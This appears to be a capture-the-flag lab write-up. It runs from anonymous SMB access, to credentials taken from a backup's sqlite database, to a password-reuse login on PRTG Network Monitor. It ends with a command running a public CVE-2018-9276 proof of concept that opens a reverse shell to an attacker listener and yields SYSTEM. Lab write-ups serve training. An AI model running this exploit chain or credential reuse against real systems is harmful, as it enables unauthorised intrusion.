## SMB

As per usual I start with a quick null authentication check using `smbclient`. We see we are able to list shares and then able to connect into the 'WebBackups' share. From here we only have one folder listen which is a zip file. We use the `get` command to download the file before moving on to inspecting its contents.

After unzipping the zip file with the `unzip` command we see the contents listed below. An immediate interesting file is db.sqlite3 file which is a database file.

Kali comes pre-installed with a application called 'DB Browser for SQlite' which we can use to open the db.sqlite3.

Moving over to the 'Browse Data' tab we see we have some credentials for `django:Se7vmMqP0al`

![](<../../../.gitbook/assets/image (653).png>)

For now we are finished with the database file.

## HTTP

When we head over to the root page of 172.31.1.21 we come to an install of PRTG network monitor.

![](<../../../.gitbook/assets/image (654).png>)

I looked up the default credentials which are `prtgadmin:prtgadmin`. The default credentials did not provide myself access to the login. I also tried the credentials we pulled from the database earlier and they not did not either.

I did then try the password of 'Se7vmMqP0al' with the default PRTG username of 'prtgadmin' and was able to login.

## Exploitation

Researching exploits for PRTG network monitor on or below version 18.1.38.11958 as defined at the bottom of the root page we come to quite a few potential exploits. The easiest and most reliable I found was a PoC created by wildkindcc.

{% embed url="https://github.com/wildkindcc/CVE-2018-9276" %}

![](<../../../.gitbook/assets/image (656).png>)

We can then run the exploit with the required parameters.

```
python2 exploit.py -i 172.31.1.21 -p 80 --lhost <IP> --lport 4455 --user prtgadmin --password Se7vmMqP0al
```

We are now SYSTEM on the server.
